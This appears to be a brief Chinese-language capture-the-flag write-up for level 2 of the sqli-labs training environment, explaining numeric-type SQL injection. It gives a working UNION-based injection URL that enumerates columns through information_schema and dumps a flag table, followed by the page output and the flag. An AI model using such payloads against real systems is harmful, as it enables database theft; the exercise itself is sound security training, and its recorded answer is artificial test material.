题目：sqli-labs less2

此题与[less1](./less-1.md)区别在于此题为数字型注入。
因此在url后加入`?id=0 union select '123',(SELECT Group_concat(column_name) FROM information_schema.columns where table_schema='ctftraining' and table_name='flag'),(SELECT Group_concat(flag) FROM ctftraining.flag) --+`，访问和，得到`flag`
```
Welcome    Dhakkan
Your Login name:flag
Your Password:flag{062c46c6-b29f-4f59-89f5-2c10de61fe75}
```
`flag`:`flag{062c46c6-b29f-4f59-89f5-2c10de61fe75}`